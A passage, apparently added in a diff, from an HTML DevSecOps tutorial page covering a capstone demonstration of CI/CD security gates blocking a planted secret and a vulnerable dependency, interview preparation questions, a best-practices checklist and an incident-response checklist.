+<p>A pipeline that has never blocked anything is untested — you don't actually know the gates work. The capstone's most valuable step is deliberately introducing a hardcoded secret and a known-vulnerable dependency and watching each gate <em>reject</em> them. That converts "we have security scanning" (a claim) into "here's the build log where the pipeline refused to ship a leaked AWS key" (evidence). It's the same principle as chaos engineering: you don't trust a safety mechanism you've never seen fire.</p>
+
+<h4>How the end-to-end gates chain together — worked run</h4>
+<div class="code-label label-output">The pipeline blocking two deliberately-planted problems</div>
+<pre><code># You committed a secret and bumped a dep to a vulnerable version on purpose:
+[code]    gitleaks: FAIL  aws-access-token in src/config.js  →  build stops
+# after removing the secret:
+[build]   trivy: FAIL   log4j-core 2.14.1  CVE-2021-44228 CRITICAL  →  build stops
+# after upgrading the dep, image is clean and gets signed:
+[release] cosign sign ...  tlog index 90210    →  ok
+# someone tries to deploy an UNSIGNED image to the cluster:
+[deploy]  admission webhook denied: image not signed by trusted CI  →  blocked
+# the signed image deploys; at runtime you exec a shell into the pod to test detection:
+[run]     Falco WARNING: shell spawned in container payments-api  →  alert to SIEM
+# Every gate fired. That log IS your portfolio evidence.</code></pre>
+
+<div class="box warn"><span class="box-title">Common capstone mistakes</span><ul><li><strong>Building the pipeline but never testing that it blocks</strong> — the one step that proves it works.</li><li><strong>Gates in "report" mode</strong> so they log but don't fail — looks secure, blocks nothing.</li><li><strong>Signing images but not enforcing verification at admission</strong> — the deploy gate is the payoff.</li><li><strong>Skipping runtime detection</strong> because "the earlier gates caught everything" — they can't catch zero-days.</li><li><strong>Not documenting it.</strong> A short README + the blocking build logs is what makes it interview-ready.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a fire drill, not just a fire plan</span><p>Having smoke detectors and exits is a plan. Actually setting off the alarm and timing the evacuation is a drill — it's the only way to know the plan works. The "prove it" step is your security fire drill: plant the fire (a secret, a CVE) and confirm every alarm goes off.</p></div>
+
+<h2 id="interview">27. Interview Prep</h2>
+<p class="section-intro">DevSecOps and DevOps interviews probe whether you understand <em>why</em>, not just <em>which command</em>. Here are the questions that come up again and again — try to answer each in your own words using this guide set.</p>
+<table>
+  <tr><th>Question</th><th>What they're really testing</th><th>Guide</th></tr>
+  <tr><td>Walk me through what happens from <code>git push</code> to running in production.</td><td>End-to-end mental model</td><td><a href="cicd-complete-guide.html#full-pipeline">CI/CD §39</a></td></tr>
+  <tr><td>How do you keep secrets out of code &amp; images?</td><td>Secrets management maturity</td><td><a href="#vault-deep">§22</a></td></tr>
+  <tr><td>Explain the difference between authentication and authorization.</td><td>Identity fundamentals</td><td><a href="#identity">§18</a></td></tr>
+  <tr><td>A pod is in CrashLoopBackOff — how do you debug it?</td><td>Practical troubleshooting</td><td><a href="kubernetes-complete-guide.html#k8s-debug">K8s §49</a></td></tr>
+  <tr><td>How does TLS actually work?</td><td>Crypto/PKI understanding</td><td><a href="#pki-tls">§17</a></td></tr>
+  <tr><td>Blue-green vs canary — when would you use each?</td><td>Deployment strategy judgment</td><td><a href="cicd-complete-guide.html">CI/CD</a></td></tr>
+  <tr><td>What are the DORA metrics and why do they matter?</td><td>Delivery-performance awareness</td><td><a href="cicd-complete-guide.html#dora">CI/CD §38</a></td></tr>
+  <tr><td>How do you right-size and cut a cloud bill?</td><td>FinOps / cost ownership</td><td><a href="cloud-aws-complete-guide.html#aws-cost-deep">Cloud §34</a></td></tr>
+  <tr><td>What's an SLO/error budget and how does it change how you ship?</td><td>SRE mindset</td><td><a href="sre-complete-guide.html#error-budgets">SRE §5</a></td></tr>
+  <tr><td>How would you secure a Kubernetes cluster?</td><td>Layered security thinking</td><td><a href="#k8s-cis">§24</a></td></tr>
+</table>
+<div class="box tip"><span class="box-title">How to prepare</span><p>Don't memorize answers — <strong>build the <a href="#capstone">capstone</a></strong> and you'll be able to answer most of these from experience. For each question, practice a <em>structured</em> answer: what it is → why it matters → how you'd do it → a tradeoff. Interviewers value "here's how I decided" over a memorized definition. The <a href="https://github.com/iam-veeramalla/DevOps-Interview-Guide" target="_blank" rel="noopener">DevOps-Interview-Guide</a> repo is a good source of more practice questions.</p></div>
+
+<h4>Why interviewers ask "why," not "which command"</h4>
+<p>Commands are searchable in seconds; judgment isn't. Interviewers probe <em>why</em> because it reveals whether you understand tradeoffs, can adapt when the situation differs from the tutorial, and can explain a decision to teammates. "Use bcrypt" is a fact; "bcrypt because it's deliberately slow and salted, so precomputed rainbow tables and GPU brute-forcing don't scale — I'd set the cost factor to target ~250ms per hash" shows you actually understand the mechanism and the tradeoff.</p>
+
+<h4>How to answer the two most common security questions well</h4>
+<div class="box note"><span class="box-title">"How does TLS actually work?" — a strong 45-second answer</span><p>"The client and server use asymmetric crypto <em>once</em> to agree on a shared session key — in TLS 1.3 via ephemeral Diffie-Hellman, so the key is never sent and past traffic stays safe even if the private key later leaks (forward secrecy). The server's certificate proves its identity: the client walks the chain from the leaf up through intermediates to a trusted root CA, checking each signature, the expiry, and that the domain matches the SAN. Once identity is proven and the key agreed, they switch to fast symmetric AES-GCM for the actual data. mTLS just adds the reverse — the server also verifies the client's cert." (This maps directly to §16–17.)</p></div>
+<div class="box note"><span class="box-title">"How do you keep secrets out of code?" — a strong answer</span><p>"Nothing sensitive in code, images, or Git. Secrets live in a manager (Vault / AWS Secrets Manager); the workload authenticates with an identity it already has — a Kubernetes ServiceAccount or IAM role — and fetches them at runtime into memory. Ideally they're <em>dynamic</em>: Vault mints a per-request DB credential on a 1-hour lease and revokes it automatically, so a leak is worthless fast. I run gitleaks in pre-commit and CI to catch mistakes, and if something does leak, the first move is to <em>rotate the credential</em>, not just delete the commit — history and clones still have it." (Maps to §6 and §22.)</p></div>
+
+<div class="box warn"><span class="box-title">Common interview mistakes</span><ul><li><strong>Reciting a definition</strong> with no "why it matters" or tradeoff — sounds memorized.</li><li><strong>Naming tools without the concept</strong> ("I'd use Trivy") instead of the mechanism ("SCA matches my dependency tree against CVE databases; Trivy is one implementation").</li><li><strong>Claiming experience you can't demonstrate</strong> — interviewers drill down; the capstone gives you real ground to stand on.</li><li><strong>Ignoring tradeoffs</strong> — every real answer has one (security vs velocity, false positives vs coverage). Naming it signals seniority.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: explain it like you're onboarding a teammate</span><p>The best interview answers sound like you're calmly bringing a new colleague up to speed: what it is, why we bother, how we do it here, and the one gotcha to watch for. If you can teach it simply, you understand it — and that's exactly what the interviewer is measuring.</p></div>
+
+<h2 id="best-practices">28. Best Practices — the master checklist</h2>
+<div class="box best"><span class="box-title">DevSecOps master checklist</span><ul>
+  <li>Threat model at design; adopt Zero Trust &amp; least privilege everywhere.</li>
+  <li>Automate SAST + SCA + secret scanning + IaC scanning in every pipeline; fail on high/critical.</li>
+  <li>Secrets in a manager with rotation; never in code/images/Git.</li>
+  <li>Sign artifacts + verify at admission; generate SBOMs; track SLSA provenance.</li>
+  <li>Harden containers (non-root, distroless, read-only) and Kubernetes (RBAC, PSS, NetworkPolicy, admission).</li>
+  <li>CSPM + CloudTrail + GuardDuty in the cloud; encrypt everything.</li>
+  <li>Runtime detection (Falco) as the last line; policy as code for compliance.</li>
+  <li>Blameless <a href="observability-k8s-guide.html#postmortems">postmortems</a> for security incidents — learn, don't blame.</li>
+</ul></div>
+
+<h2 id="troubleshooting">29. Security Incident Checklist</h2>
+<div class="trouble"><h4>Suspected credential leak</h4><p><strong>Rotate the credential immediately</strong> — assume it's compromised. Then find the exposure (git history, logs), revoke sessions/tokens, review access logs for misuse, and add scanning to prevent recurrence. Removing it from Git history does NOT un-leak it.</p></div>
+<div class="trouble"><h4>Scanner flags a critical CVE in a dependency</h4><p>Check if you use the vulnerable code path (SBOM helps). Upgrade the dependency; if no fix exists, mitigate (WAF rule, config) and track. Don't blanket-ignore criticals.</p></div>
+<div class="trouble"><h4>Falco alerts: shell spawned in a running container</h4><p>Treat as potential compromise. Isolate the pod (NetworkPolicy/cordon), capture forensics (logs, process tree), rotate any secrets it could access, then investigate root cause. Legitimate debugging should use <code>kubectl debug</code>, not exec into prod.</p></div>
+<div class="trouble"><h4>Public cloud resource discovered (open bucket/SG)</h4><p>Lock it down immediately, review access logs for exposure window, notify per your policy, and add a CSPM/policy rule so it can't recur.</p></div>
+
+<div class="box note"><span class="box-title">Where to go next</span><p>Security is woven through every guide: <a href="cicd-complete-guide.html">CI/CD</a> (pipeline scanning, OIDC, SLSA), <a href="docker-complete-guide.html">Docker</a> (image hardening), <a href="kubernetes-complete-guide.html">Kubernetes</a> (RBAC/PSS/policy), <a href="cloud-aws-complete-guide.html">Cloud</a> (IAM/KMS), and <a href="observability-k8s-guide.html">Observability</a> (detection). Back to the <a href="index.html">Learning Hub</a>.</p></div>
+
+</main>
+</div>
+<button class="back-to-top" id="backToTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+<script>
+  const links = document.querySelectorAll('.nav a');
+  const sections = [...links].map(l => document.querySelector(l.getAttribute('href'))).filter(Boolean);
+  function onScroll() {
+    let current = '';
+    const scrollPos = window.scrollY + 120;
+    sections.forEach(sec => { if (sec.offsetTop <= scrollPos) current = '#' + sec.id; });
+    links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === current));
+    const activeLink = document.querySelector('.nav a.active');
+    if (activeLink) {
+      const sb = document.querySelector('.sidebar');
+      const linkTop = activeLink.offsetTop, linkBottom = linkTop + activeLink.offsetHeight;
+      const viewTop = sb.scrollTop, viewBottom = viewTop + sb.clientHeight;
+      if (linkBottom > viewBottom - 40) sb.scrollTop = linkBottom - sb.clientHeight + 60;
+      else if (linkTop < viewTop + 80) sb.scrollTop = Math.max(0, linkTop - 80);
+    }
+    document.getElementById('backToTop').classList.toggle('show', window.scrollY > 400);
+  }
+  window.addEventListener('scroll', onScroll);
+  function filterNav() {
+    const q = document.getElementById('navSearch').value.toLowerCase();
+    document.querySelectorAll('#navList a').forEach(a => {
+      a.style.display = a.textContent.toLowerCase().includes(q) ? 'block' : 'none';
+    });
+  }
+  document.querySelectorAll('.nav a').forEach(a => a.addEventListener('click', () => {
+    if (window.innerWidth <= 900) document.querySelector('.sidebar').classList.remove('open');
+  }));
+</script>
+</body>
+</html>
